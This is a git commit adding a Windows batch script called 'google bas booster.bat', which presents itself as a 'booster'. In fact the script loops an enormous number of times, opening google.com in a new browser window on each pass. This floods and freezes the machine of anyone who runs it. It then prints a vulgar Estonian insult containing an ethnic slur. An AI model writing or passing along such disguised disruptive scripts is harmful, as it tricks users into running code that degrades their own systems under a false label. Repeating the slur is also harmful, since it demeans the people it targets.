a77c7333a7076b6c6beac46b4af114c6790235bc
v2iketip <sven.singh10@gmail.com>
2025-03-27 00:33:41 +0200

    Add files via upload

---
+++ google bas booster.bat
@@ -0,0 +1,13 @@
+@echo off
+title Bss booster
+color 0A
+
+
+for /l %%i in (1,1,9999999999999999999999) do (
+    start https://www.google.com
+)
+
+:: Lõpus ootab klahvivajutust
+echo.
+echo TURA SA OLED IKKA MONGOL
+pause >nul
